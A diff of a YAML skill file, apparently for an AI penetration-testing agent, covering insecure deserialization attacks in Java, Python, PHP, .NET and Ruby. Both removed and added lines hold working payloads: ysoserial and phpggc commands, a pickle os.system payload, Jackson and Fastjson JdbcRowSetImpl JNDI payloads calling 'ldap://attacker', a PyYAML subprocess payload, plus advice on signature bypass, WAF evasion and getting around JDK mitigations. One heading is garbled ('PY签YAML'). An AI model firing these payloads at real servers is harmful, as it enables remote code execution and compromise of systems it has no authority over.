@@ -2,105 +2,65 @@ schema_version: 1
 version: 3.0.0
 name: deserialization-attacks
 description: >
-  Multi-language insecure deserialization assessment covering Java gadget chains (ysoserial),
-  Python pickle/YAML, PHP unserialize/Phar, .NET BinaryFormatter, and Ruby Marshal.
-  Includes signed-blob bypass, second-order deserialization, and OAST-first oracle strategy.
+  Java gadget chain exploitation and polymorphic JSON/YAML typing confusion.
+  Covers ysoserial gadget triage, Jackson enableDefaultTyping, PyYAML unsafe loading,
+  and safe URLDNS out-of-band oracle confirmation.
 triggers:
-  - deserialization
-  - insecure deserialization
-  - java deserialization
-  - pickle
   - ysoserial
-  - phpggc
-  - phar
   - gadget chain
-  - unserialize
-  - binaryformatter
-  - rO0
-  - viewstate
-  - readObject
+  - jackson polymorphic
+  - urldns oracle
+  - java gadget
   - yaml.load
+  - viewstate
+  - readobject
 tools:
-  - curl
   - python3
+  - curl
 knowledge: |
-  Insecure deserialization passes attacker-controlled byte streams to language-native unmarshal
-  functions, enabling RCE, auth bypass, and logic manipulation through gadget chains.
-  Always start with a safe OAST DNS callback to confirm the sink before firing command-exec payloads.
+  Advanced deserialization targets polymorphic type resolvers and Java gadget chains where
+  the receiving parser reconstructs objects according to embedded class names and reflection.
 
-  1. SINK IDENTIFICATION — MAGIC BYTES & PATTERNS:
-     Java native serialization:  Base64 prefix "rO0" → bytes ac ed 00 05
-     PHP unserialize:            Plaintext O:, a:, s: after decoding
-     .NET BinaryFormatter:       00 01 00 00 00 ff ff ff ff
-     Python pickle:              \x80\x04 or \x80\x02 magic byte prefix
-     White-box grep targets:
-       pickle.loads    unserialize(    ObjectInputStream   BinaryFormatter
-       yaml.load       readObject(     TypeNameHandling    Marshal.load
-       json.loads with object_hook     jackson enableDefaultTyping
-
-  2. JAVA GADGET CHAIN WORKFLOW:
-     Step 1 — Confirm sink with safe DNS oracle (no command execution yet):
-       # Generate URLDNS payload (no exec, only outbound DNS)
+  1. SAFE OAST ORACLE CONFIRMATION (STEP 0 — URLDNS):
+     Before firing command execution gadgets, confirm the Java deserialization sink non-destructively:
+     - Generate URLDNS payload (invokes java.net.URL.hashCode() triggering DNS lookup, ZERO command execution):
        java -jar ysoserial.jar URLDNS "http://UNIQUE.interactsh-domain.com" | base64 -w0
-       # Inject as cookie / parameter; watch interactsh for DNS hit
-     Step 2 — Fingerprint available libraries from error messages, pom.xml, classpath leaks
-     Step 3 — Select gadget chain matching fingerprinted versions:
-       CommonsCollections1-7  (Apache CC 3.1/4.0)
-       Spring1/2               (Spring Framework)
-       Groovy1                 (Apache Groovy)
-     Step 4 — Generate bounded PoC (prefer id / hostname over destructive commands)
+     - Inject into suspect parameter, cookie (rememberMe), or HTTP header.
+     - Observe DNS interaction on interactsh:
+       If DNS request arrives, `ObjectInputStream.readObject()` is confirmed active!
 
-  3. JACKSON / JSON TYPING CONFUSION:
-     When enableDefaultTyping or @JsonTypeInfo allows attacker-chosen class names:
-       Probe:
-         ["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o","autoCommit":true}]
-       Alternative SSRF gadget via C3P0:
-         ["com.mchange.v2.c3p0.JndiRefForwardingDataSource",{"jndiName":"ldap://attacker/x","loginTimeout":0}]
+  2. JAVA CLASSPATH FINGERPRINTING & GADGET SELECTION:
+     Select gadget chains based on fingerprinted dependency versions:
+     - Apache Commons Collections:
+       CC 3.1 - 3.2.1: CommonsCollections1 (InvokerTransformer, requires security manager bypass)
+       CC 4.0: CommonsCollections2, CommonsCollections4
+       CC 3.2.2+: CommonsCollections5, CommonsCollections6 (LazyMap via TiedMapEntry)
+     - Spring Framework: Spring1, Spring2
+     - Groovy: Groovy1 (MethodClosure invocation)
+     - ROME / AspectJ / C3P0 for JNDI reference injection.
 
-  4. PYTHON PICKLE EXPLOITATION:
-     Detect: cookie/parameter with base64 blob that decodes to \x80\x04 or gASV prefix
-     Craft payload (Python 3):
-       python3 -c "
-       import pickle, os, base64
-       class E:
-           def __reduce__(self): return (os.system, ('id',))
-       print(base64.b64encode(pickle.dumps(E())).decode())
-       "
-     YAML (unsafe yaml.load):
-       !!python/object/apply:os.system ['id']
+  3. POLYMORPHIC JSON TYPING CONFUSION (JACKSON / FASTJSON):
+     When Jackson `enableDefaultTyping()` or `@JsonTypeInfo(use = Id.CLASS)` is configured:
+     Probe for SSRF / JNDI injection via arbitrary class instantiation:
+       ["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o","autoCommit":true}]
+     Fastjson AutoType Bypass:
+       When AutoType is enabled or bypassed via class name formatting:
+       `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/o","autoCommit":true}`
 
-  5. PHP UNSERIALIZE / PHAR:
-     Object Injection via magic methods (__wakeup, __destruct, __toString):
-       php-cli with phpggc: ./phpggc -b Laravel/RCE9 system id
-       Symfony: ./phpggc -b Symfony/RCE9 system id
-     Phar deserialization (trigger via file operations on phar:// URI):
-       Upload malicious .phar file, then reference via phar:///upload/file.phar to trigger deserialization
+  4. PY签YAML & RUBY MARSHAL CONFUSION:
+     - PyYAML `yaml.load(input)` without SafeLoader:
+       `!!python/object/apply:subprocess.check_output [["id"]]`
+     - Ruby `Marshal.load(input)`:
+       Craft Gem::Requirement / Gem::SpecFetcher gadget chains to achieve code execution.
 
-  6. .NET VIEWSTATE / BINARYFORMATTER:
-     ViewState without MAC validation → forge serialized payload:
-       Use ysoserial.net: ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c "ping attacker"
-     Json.NET TypeNameHandling:
-       {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
-        "MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process,...","StartInfo":{...}}}
-
-  7. SIGNED BLOB BYPASS TECHNIQUES:
-     a. HMAC weak secret / algorithm confusion: try empty key, known defaults (secret, changeme)
-     b. Strip signature and test unsigned code path (some apps validate conditionally)
-     c. Length extension on MAC if using MD5/SHA1 without HMAC construction
-     d. Second-order: store serialized blob in profile → trigger via admin export/batch job
-
-  8. ENCODING BYPASS (WAF EVASION):
-     base64 → gzip → serialize (double/triple wrapped)
-     Switch parameter location: GET vs POST vs cookie vs Content-Type
-     Unicode/UTF-7 smuggling in PHP serialized strings (PHP < 7.2 contexts)
-
-  IMPACT: RCE on application servers, auth bypass via forged session objects, full app compromise.
-  VALIDATION: Demonstrate with DNS callback first, then bounded command (id/hostname) on approval.
+  5. EVIDENCE & SITUATION HANDLING:
+     - In Java environments with modern JDK (JDK 8u191+):
+       Remote classloading over LDAP/RMI is blocked by `trustURLCodebase=false`.
+       Pivot to local gadget chains (Tomcat BeanFactory, Groovy) instead of remote classloading.
+     - Document exact library versions, vulnerable class name, and verification DNS interaction.
 references:
   - https://github.com/frohoff/ysoserial
-  - https://github.com/ambionics/phpggc
-  - https://attack.mitre.org/techniques/T1059/
-  - https://portswigger.net/web-security/deserialization
+  - https://portswigger.net/web-security/deserialization/exploiting
 provenance:
   origin: builtin
   source: persona/v0.1/skills/deserialization-attacks.yaml
